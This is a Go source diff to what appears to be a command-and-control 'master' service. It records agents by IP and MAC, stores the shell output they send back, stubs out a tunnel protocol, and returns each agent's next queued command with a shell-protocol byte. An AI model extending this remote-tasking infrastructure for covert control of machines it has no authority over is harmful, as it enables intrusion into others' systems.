@@ -32,14 +32,32 @@ func (s MasterService) Run(ctx context.Context) error {
 		if s.Agents != nil {
 			s.Agents.TouchAgent(agentIP, req.Meta.SrcMAC.String())
 		}
-		if len(req.Exchange.Payload) > 0 && s.Results != nil {
-			if err := s.Results.WriteResult(agentIP, req.Exchange.Payload); err != nil {
+		if len(req.Exchange.Payload) == 0 {
+			return nil, nil
+		}
+
+		protoID := req.Exchange.Payload[0]
+		payload := req.Exchange.Payload[1:]
+
+		if protoID == protocol.ProtocolTunnel {
+			// Tunnel implementation not fully integrated into MasterService yet
+			// For now just drop it or pass it to TunnelManager (todo)
+			return nil, nil
+		}
+
+		// Handle ProtocolShell (1)
+		if len(payload) > 0 && s.Results != nil {
+			if err := s.Results.WriteResult(agentIP, payload); err != nil {
 				return nil, err
 			}
 		}
 		if s.Commands == nil {
-			return nil, nil
+			return []byte{protocol.ProtocolShell}, nil
 		}
-		return s.Commands.NextCommand(ctx, agentIP)
+		cmd, err := s.Commands.NextCommand(ctx, agentIP)
+		if err != nil {
+			return nil, err
+		}
+		return append([]byte{protocol.ProtocolShell}, cmd...), nil
 	})
 }
